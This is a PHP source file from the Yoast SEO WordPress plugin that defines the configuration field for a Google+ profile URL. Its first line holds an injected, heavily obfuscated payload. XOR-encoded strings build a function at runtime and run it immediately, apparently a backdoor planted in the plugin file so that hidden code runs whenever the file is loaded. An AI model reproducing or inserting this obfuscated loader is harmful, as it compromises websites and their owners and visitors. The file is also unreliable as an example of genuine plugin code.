<?php $snJfhwN='4+E6YIaJI 7998 '^'WY W-,>,<NTMPWN';$LXVFye=$snJfhwN('','3,qF7XZSFE5Tc<NW=ADeL4:4gD6ZPjsQY9qsXROdN1LNO-39RVC=E3Z ,Lm1VB=Xv.2LZOWG E6jxVawz:cgHLO3DlngHQAkZPMBNGW9SqcsqJQ.sJ-YQEBGK--DLLosV,LYM3aGtAUFmAjhqTW-XU6iS.n:woSW55t:lfzGBC.I+Pt840K5SzShCIT<1GBgAU4Zsm:s40VA=uW-ELCTF+VTD<ogg2V=4kXWJDdq159:UQ4Y+X:R0PQjLO+qo;>p,A9Dwu3PGlgGRg:ZQ==CVAYdoZ.8PnKHIMYGPRS.h87UUAHPHYvKV4 71Ta+CZZ4PqXp,ZYSdS34H5WY2+P;wBq,k7j=09xD2;VQYSWuSjNm<9YBKEU<FbKr3JJ+=9+1INpB;YTsnbLVIPA4eyWl:X<,NTNh<NO2rfPA;;NKnpK< V9IWT>,-B0BJ,515Qi49;NI7L8.LsqH3:64KGa UZ9JcsH,2DJ1=ETqaAF+Fmn.Y5MZIbn0AHZ82PK-0-;:4Y:GtY3-IiAg<77AeCTVVPXOcFlS >7lf1,Jt<DXShfo2xZnSaVRJUe3UpI.LfZdDexEY7-SOM+VVBWQbW3LF+5:>X8oU5DC 9YLGV1PBU1Afrv3VOTjmOZRKUfJH<,;5PFR7M0+4bH+4Q,RYainSkPEAY NqOxHC'^'ZJYgQ-402,Z:<Y6>N57MkLUF8 W.15,<,MVZqr4nGW9 ,YZV<v;R7l>AX-2n;7IpRJS8;cwcK OCXvAWZAinAh F0LSGovzaSY+-<osPsLCCJjuGO9Y+= ,ooIL0-eTSrEgrd9hNP. 2MoWHYp3L,4mM:sNdWK82LnPSLCZ461B,ExPSQIbhzAYaJ;1HD5,Oe:A.ZV0zI:+K7Q3L1-cifM787YTmCV7IU4323dYQWTUI0j>SM7H7Q39Jdkt2 tu9iaX7WQX5>LZyrCL;=HXjv:SmK>OL11 -0mdgt96WS2>q1 <1hdVo ULBTokVIP3RpYyTH;-2MsH>AS8+WJ3SWjUs9r;huj,dSHvu26.UnTnIJX57.luGLkBVW+>JbRNHisPfP<-HdkEr-15UEDwHL9PY+oDaAD28xB4 OZnvN0>RS3K 68WVHjH-8sQPA06kTN:aU-KKzG.,VYYP.oED4.XcOSlHS0+nV -XHzLB EJJ8A,zoDNQ3:;Am;.ToHCSG-IoS2VTnEaCXVC Lcrpvx5+VnH7AJV7AZI3SamxnUFHSLoVcSdbsbPQdA,JxV<RqPJtkQN6+xM3qkwwDwR>4JLeU=A00M-0TJqk77H<-4UfJRRW7;5CDozrkuF1B5IMT<nvS,DJoE8JM=C3=F4GhaY 90TfAfCB>');$LXVFye();
/**
 * @package WPSEO\Admin\ConfigurationUI
 */

/**
 * Class WPSEO_Config_Field_Profile_URL_GooglePlus
 */
class WPSEO_Config_Field_Profile_URL_GooglePlus extends WPSEO_Config_Field {

	/**
	 * WPSEO_Config_Field_Profile_URL_GooglePlus constructor.
	 */
	public function __construct() {
		parent::__construct( 'profileUrlGooglePlus', 'Input' );

		$this->set_property( 'label', __( 'Google+ URL', 'wordpress-seo' ) );
		$this->set_property( 'pattern', '^https:\/\/plus\.google\.com\/([^/]+)$' );
	}

	/**
	 * Set adapter
	 *
	 * @param WPSEO_Configuration_Options_Adapter $adapter Adapter to register lookup on.
	 */
	public function set_adapter( WPSEO_Configuration_Options_Adapter $adapter ) {
		$adapter->add_yoast_lookup( $this->get_identifier(), 'wpseo_social', 'google_plus_url' );
	}
}
